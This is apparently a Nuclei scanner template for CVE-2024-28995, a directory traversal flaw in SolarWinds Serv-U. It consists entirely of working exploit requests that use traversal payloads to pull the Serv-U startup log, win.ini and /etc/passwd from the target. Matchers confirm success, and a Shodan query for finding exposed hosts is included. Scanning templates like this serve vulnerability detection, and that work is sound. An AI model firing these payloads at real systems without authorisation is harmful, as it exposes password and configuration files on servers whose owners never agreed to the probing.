id: CVE-2024-28995

info:
  name: SolarWinds Serv-U Directory Traversal Vulnerability
  author: kaks3c
  severity: high
  description: |
    A directory traversal vulnerability in SolarWinds Serv-U allows reading sensitive files from the host.
  reference:
    - https://www.solarwinds.com/trust-center/security-advisories/cve-2024-28995
    - https://attackerkb.com/topics/2k7UrkHyl3/cve-2024-28995/rapid7-analysis
    - https://www.rapid7.com/blog/post/2024/06/11/etr-cve-2024-28995-trivially-exploitable-information-disclosure-vulnerability-in-solarwinds-serv-u/
  metadata:
    shodan-query: product:"Rhinosoft Serv-U httpd,rhinosoft serv-u httpd"
  tags: lfi,cve2024,cve,high,serv-u

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?InternalDir=/../../../../ProgramData/RhinoSoft/Serv-U/&InternalFile=Serv-U-StartupLog.txt" #windows_1
      - "{{BaseURL}}/?InternalDir=../../../../../Windows&InternalFile=win.ini" #windows_2
      - "{{BaseURL}}/?InternalDir=\\..\\..\\..\\..\\usr\\local\\Serv-U&InternalFile=Serv-U-StartupLog.txt" #linux_1
      - "{{BaseURL}}/?InternalDir=\\..\\..\\..\\..\\etc&InternalFile=passwd" #linux_2

    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "Operating System: Windows"
        name: windows
        
      - type: regex
        part: body
        regex:
          - "\\[(font|extension|file)s\\]"
        name: windows

      - type: word
        words:
          - "Operating System: Linux"
        name: linux

      - type: regex
        regex:
          - "root:.*:0:0:"
        name: linux
        part: body

    redirects: true

stop-at-first-match: true
